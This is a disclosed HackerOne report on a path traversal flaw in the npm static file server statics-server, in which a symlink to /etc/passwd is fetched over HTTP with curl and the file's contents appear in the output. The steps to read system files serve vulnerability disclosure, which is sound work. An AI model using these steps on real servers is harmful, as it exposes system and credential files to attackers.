---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '695416'
original_report_id: '695416'
title: Path traversal using symlink
weakness: Path Traversal
team_handle: nodejs-ecosystem
created_at: '2019-09-16T07:54:32.084Z'
disclosed_at: '2019-10-07T16:39:37.919Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: statics-server
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- path-traversal
---

# Path traversal using symlink

## Metadata

- HackerOne Report ID: 695416
- Weakness: Path Traversal
- Program: nodejs-ecosystem
- Disclosed At: 2019-10-07T16:39:37.919Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report Path Traversal in statics-server

# Module

**module name:** statics-server
**version:** 0.0.9
**npm page:** `https://www.npmjs.com/package/statics-server`

## Module Description

> npm install statics-server -g
    Go to the folder you want to statics-server
    Run the server statics-server

## Module Stats

> 80-100 downloads/month

# Vulnerability

## Vulnerability Description

> Path traversal using symlink.

## Steps To Reproduce:

* Install statics-server `npm install statics-server -g`
* Run statics-server

```
hawkeye@ubuntu:~/App/$ statics-server
服务器已经启动
访问localhost:8080

```

* Create a symlink inside your project directory.
`$ ln -s /etc/passwd passwdsym`
* Send request to get file.

```
hawkeye@ubuntu:~/$ curl localhost:8080/passwdsym
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
...

```
{F583766}
## Patch

> Providing a flag to disable/enable following symlinks.

## Supporting Material/References:

- Ubuntu 19.04
- Node v10.15.2
- Npm 5.8.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows attacker to read content of arbitrary file on remote server.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
